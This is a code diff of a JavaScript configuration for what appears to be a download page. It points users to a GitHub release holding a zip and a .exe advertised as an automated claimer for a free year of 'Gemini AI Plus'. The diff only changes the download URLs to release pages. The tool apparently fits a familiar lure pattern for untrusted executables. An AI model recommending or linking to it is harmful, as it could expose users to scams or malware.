@@ -6,15 +6,15 @@
 // Configuration Object
 // Points to the public release repository and direct asset downloads:
 const CONFIG = {
-	// Direct file download URL — initiates immediate file download in browser
+	// Official GitHub Release URL:
 	DIRECT_DOWNLOAD_URL:
-		"https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases/download/v1.0.0/Gemini.AI.Plus.for.1-Year.Automated.Claimer.by.nmrisrl11.zip",
-	// Alternative standalone exe URL:
-	DIRECT_EXE_URL:
-		"https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases/download/v1.0.0/Google%20AI%20Plus%20Portal%20v1.0.0.exe",
+		"https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases/tag/v1.0.0",
+	// Alternative standalone release URL:
+	DIRECT_EXE_URL: "https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases/tag/v1.0.0",
 	// Releases hub page:
 	RELEASES_URL: "https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases",
 	RELEASE_TAG_URL: "https://github.com/nmrisrl11/gemini-ai-plus-claimer-app/releases/tag/v1.0.0",
+	GITHUB_REPO: "https://github.com/nmrisrl11/gemini-ai-plus-claimer-app",
 	DEVELOPER_PROFILE: "https://github.com/nmrisrl11",
 	VERSION: "v1.0.0",
 };
